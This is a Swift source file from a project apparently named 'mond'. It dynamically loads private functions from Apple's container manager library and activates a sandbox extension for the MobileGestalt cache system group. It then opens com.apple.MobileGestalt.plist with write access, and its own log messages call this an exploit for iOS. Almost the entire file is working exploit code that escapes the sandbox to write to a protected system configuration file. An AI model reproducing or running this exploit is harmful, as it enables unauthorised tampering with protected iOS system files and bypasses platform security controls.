//
//  cmg.swift
//  mond
//
//  Created by roooot on 16.07.26.
//  Copyright (C) 2026 roooot
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU Affero General Public License as published
//  by the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  You can find the full license text at:
//  https://www.gnu.org/licenses/agpl-3.0.html
//

import Foundation
import XPC

var g_fd: Int32 = -1

private typealias create_fn = @convention(c) () -> UnsafeMutableRawPointer?
private typealias activate_fn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Bool
private typealias free_fn = @convention(c) (UnsafeMutableRawPointer?) -> Void

private typealias set_ui64_fn = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
private func set_ui64_noop(_ q: UnsafeMutableRawPointer?, _ value: UInt64) {}
private typealias set_bool_fn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Void
private typealias set_obj_fn = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void

private typealias get_res_fn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
private typealias get_tkn_fm = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?
private typealias get_path_fn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?

func load_sym<T>(_ handle: UnsafeMutableRawPointer, _ name: String, fb: T? = nil, as: T.Type) -> T {
    if let sym = dlsym(handle, name) {
        return unsafeBitCast(sym, to: T.self)
    }

    if let fb {
        print("(cmg) missing symbol: \(name)")
        return fb
    }
    
    fatalError("(cmg) required symbol missing: '\(name)'")
}

func cmg() -> Int64 {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else { return -1 }

    let create = load_sym(lib, "container_query_create", as: create_fn.self)
    let activate = load_sym(lib, "container_object_sandbox_extension_activate", as: activate_fn.self)
    let free = load_sym(lib, "container_query_free", as: free_fn.self)

    let set_cls = load_sym(lib, "container_query_set_class", as: set_ui64_fn.self)
    let set_tran = load_sym(lib, "container_query_set_transient", as: set_bool_fn.self)
    let set_gids = load_sym(lib, "container_query_set_group_identifiers", as: set_obj_fn.self)
    let set_plat = load_sym(lib, "container_query_operation_set_platform", as: set_ui64_fn.self)
    let set_flag = load_sym(lib, "container_query_operation_set_flags", as: set_ui64_fn.self)
    let set_part = load_sym(lib, "container_query_operation_set_part", fb: set_ui64_noop, as: set_ui64_fn.self)

    let get_res = load_sym(lib, "container_query_get_single_result", as: get_res_fn.self)
    let get_tkn = load_sym(lib, "container_object_get_sandbox_token", as: get_tkn_fm.self)
    let get_path = load_sym(lib, "container_object_get_path", as: get_path_fn.self)

    guard let q = create() else { return -1 }
    set_cls(q, 13)
    set_tran(q, false)

    let arr = xpc_array_create(nil, 0)
    xpc_array_set_string(arr, XPC_ARRAY_APPEND, "systemgroup.com.apple.mobilegestaltcache")
    set_gids(q, arr)

    set_plat(q, 2)
    set_flag(q, (1 << 32) | (1 << 39))
    set_part(q, 3)

    guard let res = get_res(q) else { free(q); return -1 }
    print("(cmg) result:", res)
    let tkn = get_tkn(res)
    print("(cmg) token:", tkn ?? "nil")
    guard activate(res, true) else { free(q); return -1 }

    guard let c_path = get_path(res) else { free(q); return -1 }
    let path = String(cString: c_path)
    
    free(q)

    let file = path + "/com.apple.MobileGestalt.plist"
    g_fd = file.withCString {
        Darwin.open($0, O_WRONLY | O_CLOEXEC | O_NOFOLLOW)
    }
    
    let flags = Darwin.fcntl(g_fd, F_GETFL)

    if flags == -1 {
        print("(cmg) fcntl failed:", errno)
        print("(cmg)", is_supported() ? "exploit failed" : "exploit failed: unsupported iOS?")
    } else {
        print("(cmg) fd flags:", flags)
        print("(cmg) write enabled:", (flags & O_ACCMODE) == O_WRONLY || (flags & O_ACCMODE) == O_RDWR)
    }

    return Int64(g_fd)
}
